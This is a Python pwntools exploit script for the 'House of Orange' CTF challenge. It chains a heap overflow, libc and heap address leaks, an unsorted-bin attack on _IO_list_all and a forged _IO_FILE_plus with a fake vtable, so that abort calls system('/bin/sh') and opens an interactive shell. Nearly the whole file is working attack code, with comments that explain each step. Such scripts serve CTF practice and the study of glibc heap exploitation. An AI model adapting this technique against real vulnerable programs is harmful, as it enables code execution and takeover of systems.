import sys
from pwn import *

"""
reference:
http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html
https://1ce0ear.github.io/2017/11/26/study-house-of-orange/
https://1ce0ear.github.io/2017/09/25/File-Stream-Pointer-Overflow1/
"""

def build(length, name, price, color):
    r.sendlineafter('Your choice :', '1')
    r.sendlineafter('Length of name :', str(length))
    r.sendlineafter('Name :', name)
    r.sendlineafter('Price of Orange:', str(price))
    r.sendlineafter('Color of Orange:', str(color))

def see():
    r.sendlineafter("Your choice :", '2')
    return r.recvuntil("+++++++++++++++++++++++++++++++++++++")

def upgrade(length, name, price, color):
    r.sendlineafter('Your choice :', '3')
    r.sendlineafter('Length of name :', str(length))
    r.sendlineafter('Name:', name)
    r.sendlineafter('Price of Orange:', str(price))
    r.sendlineafter('Color of Orange:', str(color))

def create_unsortedbin():
    # overwrite top size by using heap overflow.
    build(0x80, 'hogehoge', 100, 1)
    payload = b'a' * 0x88
    payload += p64(0x21) + p64(0)*3 # 0x21 is chunk size.
    payload += p64(0xf31) # fake top size. Satisfaction of 0xd0(low bits of top chunk address)+0xf31=0x1001 is important.
    upgrade(len(payload)+1, payload, 100, 1)
    build(0x1000,"hogehoge",100,1) # trigger the _int_free in sysmalloc and creates unsorted bin.

def leak_libc():
    build(0x400,"b"*7,100,1) # create large_chunk for getting libc(using bk) and heap(using fd_nextsize).'b'*7+'\n' connects name
                             # with bk.
    leak_libc = see().split(b'Price')[0].split()[-1].ljust(8,b'\x00')
    libc_offset = 0x3c5268 # evaluated by debug.
    libc_base =  u64(leak_libc) - libc_offset
    return libc_base

def leak_heap():
    upgrade(0x400,'c'*15,100,1) # 'c'*15+'\n' connects name with fd_nextsize.
    leak_heap = see().split(b'Price')[0].split()[-1].ljust(8,b'\x00')
    heap_offset = 0x130 # evaluated by debug.
    heap_base = u64(leak_heap) - heap_offset
    return heap_base

def hijack_mallocabort(libc_base, heap_base):
    """
    Creates fake _IO_FILE_plus in heap.
    By unsortedbin attack, _IO_list_all points main_arena.
    main_arena is as _IO_FILE_plus, small_bin[4] is _chain.
    The small_bin[4] points fake _IO_FILE_plus in heap.
    fake _IOI_FILE_plus in heap has system in vtable, originally it is _IO_OVERFLOW.
    _IO_flush_all_lockp in abort uses fp(=*_IO_list_all) and runs _IO_OVERFLOW if check is bypassed.
    If check is not be bypassed, fp changes to IO_list_all=>_chain and do the same check.
    Therefore, abort runs => check is not be bypassed(_IO_FILE_plus in main arena) => check is bypassed (fake _IO_FILE_plus in heap).
    => run _IO_OVERFLOW in fake _IO_FILE_plus in heap(this function is system), and run shell.
    """
    iolistall_offset = 0x3c5600
    system_offset = 0x443d0
    libc_iolistall = libc_base + iolistall_offset
    libc_system = libc_base + system_offset
    fakevtable_offset = 0x658 # creats fake vtable in heap.
    fakevtable = heap_base + fakevtable_offset

    # fake file structure
    payload = b"b"*0x408
    payload += p64(0x21) + p64(0)*2
    """
    Fake _IO_FILE_plus is as follows to bypass follows check and runs system("/bin/sh") eventually.

    if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
          || (_IO_vtable_offset (fp) == 0
              && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
                                   > fp->_wide_data->_IO_write_base))
    """
    # ======== fake _IO_FILE_plus starts ========
    # ========= fake _IO_FILE starts =========
    stream = b"/bin/sh\x00" + p64(0x61) # Originally, this addr is unsorted bin chunk.
                                        # Unsorted bin with 0x60 is settled to smallbin[4], so 
                                        # abort => main_arena(fake _IO_FILE_plus 1) => 
                                        # this fake chunk(fake _IO_FILE_plu 2 stored by fake _IO_FILE_plus 1's _chain at top+0x68(=smallbin[4]))
                                        # => system('/bin/sh') (_IO_OVERFLOW)
    """
    bck = victim->bk;
    ...
    unsorted_chunks (av)->bk = bck;
    bck->fd = unsorted_chunks (av);
    
    This is process of unsorted bins.
    By unsorted bin attack, if victim->bk=libc_iolistall-0x10, libc_iolistall points unsorted_chunks(av)(=main_arena).
    """
    stream += p64(0xdeadbeaf) + p64(libc_iolistall-0x10) # Unsortbin attack, this addr is victim->bk.
    stream += p64(0) + p64(1) # _IO_write_base, _IO_write_ptr to bypass above check.
    stream = stream.ljust(0xc0,b"\x00")
    stream += p64(0) # _mode to bypass above check.
    payload += stream
    payload += p64(0)
    payload += p64(0)
    payload += p64(fakevtable)
    payload += p64(1)
    payload += p64(2)
    payload += p64(3) 
    # ========= fake _IO_FILE ends =========
    # ========= fake _IO_jump_t(vtable) starts =========
    payload += p64(0)*3 # fake vtable 1,2,3
    payload += p64(libc_system) # fake vtables 4. this offset is _IO_OVERFLOW.
    # ========= fake _IO_jump_t(vtable) ends =========
    # ======== fake _IO_FILE_plus ends ========
    upgrade(0x800,payload,100,1)
    r.sendlineafter('Your choice :', '1') # do abort.

def exploit():
    create_unsortedbin()
    libc_base = leak_libc()
    log.info('libc_base is {}'.format(hex(libc_base)))
    heap_base = leak_heap()
    log.info('heap_base is {}'.format(hex(heap_base)))
    hijack_mallocabort(libc_base, heap_base)
    log.info('hijacking abort in malloc.')
    log.info('run shell!')
    r.interactive()

if __name__ == '__main__':
    if len(sys.argv) < 2:
        log.error('argv error.')
        exit(1)  
    if sys.argv[1] == 'local':
        r = process('./houseoforange')
    elif sys.argv[1] == 'remote':
        r = remote('127.0.0.1', 7777)
    else:
        log.info("argv error.")
    exploit()
